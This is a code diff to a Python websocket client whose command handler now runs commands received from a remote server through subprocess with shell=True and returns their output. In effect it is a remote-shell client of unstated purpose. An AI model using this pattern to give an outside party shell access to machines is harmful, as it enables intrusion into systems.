@@ -10,7 +10,7 @@ import asyncio
 import websockets
 from threading import Thread
 import time
-
+from subprocess import Popen, DEVNULL, STDOUT, PIPE
 
 class CmdManager:
     """A class-based context manager for checking commands"""
@@ -48,9 +48,11 @@ class CmdManager:
 
     def _check_other_cmd(self, cmd):
         """Manages other commads"""
+        print(f"\n\tcommand |{cmd}|\n")
         try:
-            r = os.popen(" ".join(cmd)).read()
-            return r
+            r = Popen( " ".join(cmd), stdout=PIPE, stderr=STDOUT, stdin=DEVNULL, shell=True)
+            out, err = r.communicate()
+            return out.decode("utf-8") 
         except Exception as e:
             return str(e)
 
@@ -83,8 +85,7 @@ class Client:
         async with websockets.connect(self._uri) as ws:
             await ws.send(self._pwd())
             if bug:
-                await ws.send("No such commad or there was an Error")
-                await ws.send(self._pwd())
+                pass
             while True:
                 try:
                     cmd = await ws.recv()
